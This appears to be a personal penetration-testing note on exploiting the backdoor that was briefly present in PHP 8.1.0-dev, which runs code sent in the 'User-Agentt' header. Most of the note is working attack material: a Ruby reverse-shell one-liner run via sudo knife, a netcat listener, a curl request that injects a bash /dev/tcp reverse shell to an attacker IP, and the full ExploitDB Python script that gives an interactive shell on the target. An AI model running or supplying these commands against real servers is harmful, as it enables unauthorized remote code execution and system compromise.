---
id: Exploitation
aliases: []
tags:
  - Programming/PHP/Exploitation
---

# Exploitation

<!-- Vulnerabilities {{{-->
## Vulnerabilities

<!-- User-Agentt RCE {{{-->
### User-Agentt RCE

```sh
sudo knife 'ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.110",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end''
```

<!-- Info {{{-->
> [!info]-
>
> PHP version `8.1.0-dev` was [released](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a)
> with a backdoor on March 28th, 2021
> where two malicious commits were pushed to the php-src-repo,
> but the backdoor was quickly discovered and removed
>
> The code checks for the first occurrence of the zerodium string
> in the User-Agentt request header.
> If found, it executes the code after that string.
>
> ```sh
> zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
> ```
<!-- }}} -->

**METHOD 1**

1. [[Netcat]] - Set up a Netcat listener

```sh
ncat -lvnp 1234
```

2. [[cURL]] - Query the target with malformed [[User-Agent String]]

```sh
curl http://$target/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i &>/dev/tcp/<attacke_ip>/1234 0>&1 '\");"
```

**METHOD 2**

[[ExploitDB]] - [PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution](https://www.exploit-db.com/exploits/49933)

```sh
touch exploit.py
```

```sh
chmod +x exploit.py
```

```sh
./exploit.py
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> # Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
> # Date: 23 may 2021
> # Exploit Author: flast101
> # Vendor Homepage: https://www.php.net/
> # Software Link: 
> #     - https://hub.docker.com/r/phpdaily/php
> #    - https://github.com/phpdaily/php
> # Version: 8.1.0-dev
> # Tested on: Ubuntu 20.04
> # References:
> #    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
> #   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md
>
> """
> Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
> Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
> Contact: flast101.sec@gmail.com
>
> An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
> The following exploit uses the backdoor to provide a pseudo shell ont the host.
> """
>
> #!/usr/bin/env python3
> import os
> import re
> import requests
>
> host = input("Enter the full host url:\n")
> request = requests.Session()
> response = request.get(host)
>
> if str(response) == '<Response [200]>':
>     print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
>     try:
>         while 1:
>             cmd = input("$ ")
>             headers = {
>             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
>             "User-Agentt": "zerodiumsystem('" + cmd + "');"
>             }
>             response = request.get(host, headers = headers, allow_redirects = False)
>             current_page = response.text
>             stdout = current_page.split('<!DOCTYPE html>',1)
>             text = print(stdout[0])
>     except KeyboardInterrupt:
>         print("Exiting...")
>         exit
>
> else:
>     print("\r")
>     print(response)
>     print("Host is not available, aborting...")
>     exit
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
